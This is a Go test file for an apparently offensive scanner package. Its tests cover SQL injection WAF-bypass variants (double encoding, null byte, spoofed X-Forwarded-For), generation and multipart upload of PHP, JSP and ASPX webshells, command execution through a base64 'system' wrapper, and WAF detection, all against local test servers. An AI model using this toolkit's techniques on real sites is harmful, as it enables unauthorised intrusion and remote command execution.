package scanner

import (
	"context"
	"encoding/base64"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"
)

func TestBuildBypassVariants(t *testing.T) {
	variants := BuildBypassVariants("/api/query", "id", "' or 1=1--")
	if len(variants) < 10 {
		t.Fatalf("too few variants: %d", len(variants))
	}
	byName := map[string]BypassVariant{}
	for _, v := range variants {
		byName[v.Name] = v
	}
	if byName["baseline"].Path != "/api/query?id=%27+or+1%3D1--" {
		t.Fatalf("baseline path: %s", byName["baseline"].Path)
	}
	if !strings.Contains(byName["doubleencode"].Path, "%2527") {
		t.Fatalf("double encode missing: %s", byName["doubleencode"].Path)
	}
	if !strings.Contains(byName["nullbyte"].Path, "%00") {
		t.Fatalf("null byte missing: %s", byName["nullbyte"].Path)
	}
	if byName["xff"].Headers["X-Forwarded-For"] != "127.0.0.1" {
		t.Fatalf("xff header missing: %+v", byName["xff"].Headers)
	}
	if byName["post"].Method != http.MethodPost || byName["post"].Body == "" {
		t.Fatalf("post variant invalid: %+v", byName["post"])
	}
}

func TestBuildShellPayload(t *testing.T) {
	php := BuildShellPayload("php", "s3cr3t")
	if !strings.Contains(php.Content, "s3cr3t") || php.Filename != "shell.php" {
		t.Fatalf("php payload: %+v", php)
	}
	jsp := BuildShellPayload("jsp", "s3cr3t")
	if !strings.Contains(jsp.Content, "s3cr3t") || !strings.Contains(jsp.Content, "Runtime.getRuntime") {
		t.Fatalf("jsp payload: %+v", jsp)
	}
	aspx := BuildShellPayload("aspx", "s3cr3t")
	if !strings.Contains(aspx.Content, "s3cr3t") || !strings.Contains(aspx.Content, "Process") {
		t.Fatalf("aspx payload: %+v", aspx)
	}
}

func TestUploadWebshellMultipart(t *testing.T) {
	var gotName, gotBody string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if err := r.ParseMultipartForm(1 << 20); err != nil {
			t.Errorf("parse multipart: %v", err)
			w.WriteHeader(400)
			return
		}
		f, fh, err := r.FormFile("file")
		if err != nil {
			t.Errorf("form file: %v", err)
			w.WriteHeader(400)
			return
		}
		defer f.Close()
		gotName = fh.Filename
		b, _ := io.ReadAll(f)
		gotBody = string(b)
		w.WriteHeader(200)
		_, _ = w.Write([]byte("ok"))
	}))
	defer srv.Close()

	payload := BuildShellPayload("php", "pw")
	res := UploadWebshell(context.Background(), NewDeepClient(5*time.Second), srv.URL, "file", payload.Filename, []byte(payload.Content), map[string]string{"dir": "/upload"}, nil)
	if !res.Success || res.StatusCode != 200 {
		t.Fatalf("upload failed: %+v", res)
	}
	if gotName != "shell.php" || !strings.Contains(gotBody, "pw") {
		t.Fatalf("upload content: name=%q body=%q", gotName, gotBody)
	}
}

func TestWebshellCommandRoundTrip(t *testing.T) {
	payload := BuildShellPayload("php", "pw")
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_ = r.ParseForm()
		cmd := r.PostFormValue("pw")
		const prefix, suffix = "@system(base64_decode('", "'));"
		if strings.HasPrefix(cmd, prefix) && strings.HasSuffix(cmd, suffix) {
			if raw, err := base64.StdEncoding.DecodeString(strings.TrimSuffix(strings.TrimPrefix(cmd, prefix), suffix)); err == nil {
				cmd = string(raw)
			}
		}
		w.WriteHeader(200)
		_, _ = w.Write([]byte("out:" + cmd))
	}))
	defer srv.Close()

	out, err := RunShellCommand(context.Background(), NewDeepClient(5*time.Second), srv.URL, payload, "id")
	if err != nil {
		t.Fatalf("run command: %v", err)
	}
	if !strings.Contains(out, "out:id") {
		t.Fatalf("command output: %q", out)
	}
	alive, note := CheckShellAlive(context.Background(), NewDeepClient(5*time.Second), srv.URL, payload)
	if !alive {
		t.Fatalf("shell not alive: %s", note)
	}
}

func TestDetectWAF(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.Contains(r.URL.RawQuery, "jw_probe") {
			w.Header().Set("Server", "cloudflare")
			w.WriteHeader(403)
			_, _ = w.Write([]byte("<h1>Access denied</h1>"))
			return
		}
		w.Header().Set("CF-RAY", "abc123")
		w.WriteHeader(200)
		_, _ = w.Write([]byte("<html>ok</html>"))
	}))
	defer srv.Close()

	det := DetectWAF(context.Background(), NewDeepClient(5*time.Second), srv.URL)
	if !det.Detected {
		t.Fatalf("waf not detected: %+v", det)
	}
	if det.Vendor != "Cloudflare" {
		t.Fatalf("waf vendor: %q", det.Vendor)
	}
	if !det.Blocked {
		t.Fatalf("probe not blocked: %+v", det)
	}
}

func TestRunBypassProbes(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.Contains(r.URL.RawQuery, "union") && !strings.Contains(r.URL.RawQuery, "%2525") {
			w.WriteHeader(403)
			_, _ = w.Write([]byte("blocked by WAF"))
			return
		}
		w.WriteHeader(200)
		_, _ = w.Write([]byte("data: union select ok"))
	}))
	defer srv.Close()

	variants := BuildBypassVariants("/api", "q", "union")
	probes := RunBypassProbes(context.Background(), NewDeepClient(5*time.Second), srv.URL, variants, []string{"union select ok"})
	var bypassed, blocked int
	for _, p := range probes {
		switch p.Verdict {
		case "bypassed":
			bypassed++
		case "blocked":
			blocked++
		}
	}
	if bypassed == 0 {
		t.Fatalf("no bypass detected: %+v", probes)
	}
	if blocked == 0 {
		t.Fatalf("no blocked variant detected: %+v", probes)
	}
}
